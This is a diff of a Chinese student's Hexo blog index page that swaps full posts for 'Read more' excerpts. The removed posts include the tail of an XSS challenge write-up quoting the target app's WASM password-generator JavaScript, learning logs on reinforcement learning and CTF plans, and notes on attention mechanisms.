class="property">buffer</span>);</span><br><span class="line">    <span class="keyword">let</span> options = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(json.<span class="property">length</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">let</span> password = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(<span class="title class_">Number</span>(passwordLength) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; json.<span class="property">length</span>; ++idx) &#123;</span><br><span class="line">        u8[options + idx] = json.<span class="title function_">codePointAt</span>(idx) % <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    u8[options + json.<span class="property">length</span>] = <span class="number">0</span>;</span><br><span class="line">    wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">generate_password</span>(options, password);</span><br><span class="line">    <span class="keyword">let</span> output_password = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; passwordLength; ++idx) &#123;</span><br><span class="line">        output_password += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[password + idx]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">showMessage</span>(<span class="string">&quot;Password Generated&quot;</span>, <span class="string">&quot;Your password is: &quot;</span> + output_password, &#123;</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">        <span class="attr">action</span>: <span class="string">&quot;generateAnother();&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最后用到了栈溢出的知识 看的蒙蒙的 。。。</p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://terjanq.medium.com/blind-sql-injection-without-an-in-1e14ba1d4952">https://terjanq.medium.com/blind-sql-injection-without-an-in-1e14ba1d4952</a></p>
-
+          <h1 id="一个xss挑战"><a href="#一个xss挑战" class="headerlink" title="一个xss挑战"></a>一个xss挑战</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/11/one-xss-challenge/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -914,7 +815,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-04-13 18:25:58" itemprop="dateModified" datetime="2022-04-13T18:25:58+08:00">2022-04-13</time>
+      <time title="Modified: 2022-04-13 18:38:44" itemprop="dateModified" datetime="2022-04-13T18:38:44+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -936,91 +837,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="learn-month1"><a href="#learn-month1" class="headerlink" title="learn-month1"></a>learn-month1</h1><h2 id="learn-day1"><a href="#learn-day1" class="headerlink" title="learn-day1"></a>learn-day1</h2><blockquote>
-<p>本文为learn365第一篇 记录每日学习内容</p>
-</blockquote>
-<h3 id="done"><a href="#done" class="headerlink" title="done"></a>done</h3><p><a target="_blank" rel="noopener" href="https://github.com/godrun666/team-learning-rl">godrun666/team-learning-rl (github.com)</a></p>
-<p>datawhale的开源强化学习学习计划</p>
-<p>15day</p>
-<ul>
-<li>今天开始Task1 目前把书读了 明天把code敲一敲</li>
-<li>读了一篇论文的一部分 继续学习 attention</li>
-<li>看一个xss （晚上搞   –<a target="_blank" rel="noopener" href="https://terjanq.medium.com/how-to-solve-a-challenge-from-intigrity-in-under-60-minutes-6843ba9b9552">How to solve an XSS challenge from Intigriti in under 60 minutes | by terjanq | Medium</a></li>
-<li>雅思单词+ted*1</li>
-</ul>
-<blockquote>
-<h6 id="Task1：强化学习基础（2天）"><a href="#Task1：强化学习基础（2天）" class="headerlink" title="Task1：强化学习基础（2天）"></a>Task1：强化学习基础（2天）</h6><ul>
-<li>了解强化学习的基本概念；</li>
-<li>掌握 Gym 的使用；</li>
-<li>对应教程的第一章。</li>
-</ul>
-</blockquote>
-<p>由于要参加datawhale的15day计划 可能强化学习要拖到三月底到四月初来解决了</p>
-<h3 id="记录一些杂事"><a href="#记录一些杂事" class="headerlink" title="记录一些杂事"></a>记录一些杂事</h3><ul>
-<li>和导师谈了谈 确定了srtp的方向 准备入手了</li>
-<li>明天有UTCTF 看看web题目</li>
-<li>论文读起来很吃力 要想办法解决</li>
-</ul>
-<h2 id="learn2-amp-3"><a href="#learn2-amp-3" class="headerlink" title="learn2&amp;3"></a>learn2&amp;3</h2><p>周末没干啥大事 新到了手柄沉迷了一下 (鬼泣5真香)  看了看UTCTF的web</p>
-<p>摸鱼 0.0</p>
-<h2 id="learn4"><a href="#learn4" class="headerlink" title="learn4"></a>learn4</h2><p>学习了 GNN 的基本原理</p>
-<p>发现宝藏网站</p>
-<p><a target="_blank" rel="noopener" href="https://distill.pub/">Distill — Latest articles about machine learning</a></p>
-<p>好视频</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1H44y1t75x?spm_id_from=333.999.0.0">如何读论文【论文精读】_哔哩哔哩_bilibili</a></p>
-<h2 id="learn5-7"><a href="#learn5-7" class="headerlink" title="learn5~7"></a>learn5~7</h2><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p><a target="_blank" rel="noopener" href="https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6">https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6</a></p>
-<p><a target="_blank" rel="noopener" href="https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1">https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1</a></p>
-<h3 id="done-1"><a href="#done-1" class="headerlink" title="done"></a>done</h3><ul>
-<li><p>实践了一丢丢xss</p>
-</li>
-<li><p>看了部分动手学深度学习</p>
-</li>
-<li><p>读了点论文</p>
-</li>
-</ul>
-<h3 id="fail-to-do"><a href="#fail-to-do" class="headerlink" title="fail to do"></a>fail to do</h3><p>AST injection 没完全搞明白 。。。失败</p>
-<h2 id="learn6-8"><a href="#learn6-8" class="headerlink" title="learn6~8"></a>learn6~8</h2><h3 id="source-1"><a href="#source-1" class="headerlink" title="source"></a>source</h3><p><a target="_blank" rel="noopener" href="https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6">https://terjanq.medium.com/massive-xs-search-over-multiple-google-products-416e50dd2ec6</a></p>
-<p><a target="_blank" rel="noopener" href="https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1">https://medium.com/@takshalpentester/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1</a></p>
-<h3 id="done-2"><a href="#done-2" class="headerlink" title="done"></a>done</h3><ul>
-<li><p>学会了 auto AI 2333</p>
-</li>
-<li><p>实践了一丢丢xss</p>
-</li>
-<li><p>看了部分动手学深度学习</p>
-</li>
-<li><p>读了点论文</p>
-</li>
-</ul>
-<h3 id="fail-to-do-1"><a href="#fail-to-do-1" class="headerlink" title="fail to do"></a>fail to do</h3><p>AST injection 没完全搞明白 。。。失败</p>
-<h3 id="plan"><a href="#plan" class="headerlink" title="plan"></a>plan</h3><p>复现俩misc </p>
-<p><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#ti-1337-silver-edition">https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#ti-1337-silver-edition</a></p>
-<p>集成学习 实践一下</p>
-<h2 id="很久没记录了-4-2"><a href="#很久没记录了-4-2" class="headerlink" title="很久没记录了 4.2"></a>很久没记录了 4.2</h2><p>最近比较开心的是被nus的 summer workshop 录取了</p>
-<p>记录一手周末的学习记录</p>
-<h2 id="work1"><a href="#work1" class="headerlink" title="work1"></a>work1</h2><p>先学一手datawhale的异常检测 </p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1tV411b7Ck">https://www.bilibili.com/video/BV1tV411b7Ck</a></p>
-<h3 id="COPOD方法"><a href="#COPOD方法" class="headerlink" title="COPOD方法"></a>COPOD方法</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/338189299">https://zhuanlan.zhihu.com/p/338189299</a></p>
-<h2 id="work2"><a href="#work2" class="headerlink" title="work2"></a>work2</h2><p>李宏毅的异常检测部分</p>
-<h2 id="learn23-记录一下周末的学习"><a href="#learn23-记录一下周末的学习" class="headerlink" title="learn23-记录一下周末的学习"></a>learn23-记录一下周末的学习</h2><h3 id="midsunctf"><a href="#midsunctf" class="headerlink" title="midsunctf"></a>midsunctf</h3><p>看了一题web 没做出来（失败的我 可恶啊</p>
-<h3 id="srtp"><a href="#srtp" class="headerlink" title="srtp"></a>srtp</h3><p>正在立项 讨论ing 希望不会挂</p>
-<h3 id="LSTM学习"><a href="#LSTM学习" class="headerlink" title="LSTM学习"></a>LSTM学习</h3><p><a target="_blank" rel="noopener" href="http://karpathy.github.io/2015/05/21/rnn-effectiveness/">http://karpathy.github.io/2015/05/21/rnn-effectiveness/</a></p>
-<h3 id="kaggle竞赛事件-——-计划下周日前完成学习"><a href="#kaggle竞赛事件-——-计划下周日前完成学习" class="headerlink" title="kaggle竞赛事件  ——  计划下周日前完成学习"></a>kaggle竞赛事件  ——  计划下周日前完成学习</h3><p><a target="_blank" rel="noopener" href="https://www.kaggle.com/c/web-traffic-time-series-forecasting">https://www.kaggle.com/c/web-traffic-time-series-forecasting</a></p>
-<h3 id="找找英文课听"><a href="#找找英文课听" class="headerlink" title="找找英文课听"></a>找找英文课听</h3><p>为了summer workshop 不会在语言关上被 ko  555 ~</p>
-<h2 id="learn31"><a href="#learn31" class="headerlink" title="learn31"></a>learn31</h2><p>小总结一下</p>
-<p>最近上网课 实在是懈怠了 不知不觉 learn系列已经来到了31   每天坚持记录真的很难 </p>
-<p>从现在开始   必须坚持每两天记录一次(at least)</p>
-<h3 id="总结一下-4-10-4-11-周末"><a href="#总结一下-4-10-4-11-周末" class="headerlink" title="总结一下 4.10 ~ 4.11 周末"></a>总结一下 4.10 ~ 4.11 周末</h3><ul>
-<li>看了PlaidCTF 没输出（ 周一 也就是今天 要复现一下 写成blog</li>
-<li>srtp申请 仍在进行中</li>
-<li>完成了几个作业</li>
-</ul>
-<h3 id="goals-4-11"><a href="#goals-4-11" class="headerlink" title="goals 4.11"></a>goals 4.11</h3><ul>
-<li>开始学习 cs107e</li>
-<li>复现PlaidCTF</li>
-<li>数值分析作业 + 计组实验预习</li>
-<li>听一节汇编的课</li>
-</ul>
-
+          <h1 id="learn-month1"><a href="#learn-month1" class="headerlink" title="learn-month1"></a>learn-month1</h1><p>第一月的学习记录  整合过来</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/11/learn-month1/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1074,9 +899,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-03-11 12:50:56 / Modified: 12:51:03" itemprop="dateCreated datePublished" datetime="2022-03-11T12:50:56+08:00">2022-03-11</time>
+      <time title="Created: 2022-03-11 12:50:56" itemprop="dateCreated datePublished" datetime="2022-03-11T12:50:56+08:00">2022-03-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-04-13 18:38:20" itemprop="dateModified" datetime="2022-04-13T18:38:20+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1101,21 +932,14 @@
           <h1 id="立个flag-–-about-sec"><a href="#立个flag-–-about-sec" class="headerlink" title="立个flag – about sec"></a>立个flag – about sec</h1><p>浏览Twitter的时候看到了 s1ru1us 的blog</p>
 <p><a target="_blank" rel="noopener" href="https://blog.s1r1us.ninja/home">https://blog.s1r1us.ninja/home</a></p>
 <p>看了他关于新的一年的总结 十分有感触</p>
-<p>他是一个非常有任性的安全工程师 和他比起来 我所接受的教育无疑是更幸运的的 但他通过自己的努力走出了一条道路 并最后成功</p>
-<p>看了他的研究路线很受启发  因为最近在搞AI方面东西 在CTF上花的时间就更少了</p>
-<p>我决定专精一方面来弥补 – 所以把研究方向选为 <strong>浏览器安全</strong></p>
-<p>我决定在这学期内采纳一些他的学习路线</p>
-<ul>
-<li>solve every xss challenge on  <a target="_blank" rel="noopener" href="https://twitter.com/terjanq">terjang</a>‘s twitter</li>
-<li>read every blog <a target="_blank" rel="noopener" href="https://blog.s1r1us.ninja/inspiration">https://blog.s1r1us.ninja/inspiration</a></li>
-</ul>
-<p>这将是一个不小的挑战 在研究AI和维持绩点之余</p>
-<p>希望可以走的更远</p>
-<p>最后一个flag</p>
-<ul>
-<li>be the full member of r3kapig</li>
-</ul>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/11/flag-sec/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1169,9 +993,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2022-03-09 20:25:56 / Modified: 22:02:34" itemprop="dateCreated datePublished" datetime="2022-03-09T20:25:56+08:00">2022-03-09</time>
+      <time title="Created: 2022-03-09 20:25:56" itemprop="dateCreated datePublished" datetime="2022-03-09T20:25:56+08:00">2022-03-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-04-13 18:38:08" itemprop="dateModified" datetime="2022-04-13T18:38:08+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1194,18 +1024,14 @@
     
     <div class="post-body" itemprop="articleBody">
           <h1 id="注意力机制学习"><a href="#注意力机制学习" class="headerlink" title="注意力机制学习"></a>注意力机制学习</h1><p>带我的学长发了篇论文给我 让我学一下 Multi-attention 开始动工了~~</p>
-<h2 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Wv411h7kN?p=41">李宏毅机器学习 self-attention</a></li>
-<li>读论文 attention is all you need</li>
-<li><a target="_blank" rel="noopener" href="https://luweikxy.gitbook.io/machine-learning-notes/self-attention-and-transformer">https://luweikxy.gitbook.io/machine-learning-notes/self-attention-and-transformer</a></li>
-</ul>
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
-<p>​        深度学习里的Attention model其实模拟的是人脑的注意力模型，举个例子来说，当我们观赏一幅画时，虽然我们可以看到整幅画的全貌，但是在我们深入仔细地观察时，其实眼睛聚焦的就只有很小的一块，这个时候人的大脑主要关注在这一小块图案上，也就是说这个时候人脑对整幅图的关注并不是均衡的，是有一定的权重区分的。这就是深度学习里的Attention Model的核心思想。</p>
-<p>　　人脑的注意力模型，说到底是一种资源分配模型，在某个特定时刻，你的注意力总是集中在画面中的某个焦点部分，而对其它部分视而不见。</p>
-<p>​        注意力模型最近几年在深度学习各个领域被广泛使用，无论是图像处理、语音识别还是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">自然语言处理</a>的各种不同类型的任务中，都很容易遇到注意力模型的身影。所以，了解注意力机制的工作原理对于关注深度学习技术发展的技术人员来说有很大的必要。</p>
-</blockquote>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40027052/article/details/78421155">(32条消息) 深度学习中的注意力机制_CSDN人工智能-CSDN博客_机器学习 注意力机制</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/09/attention/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
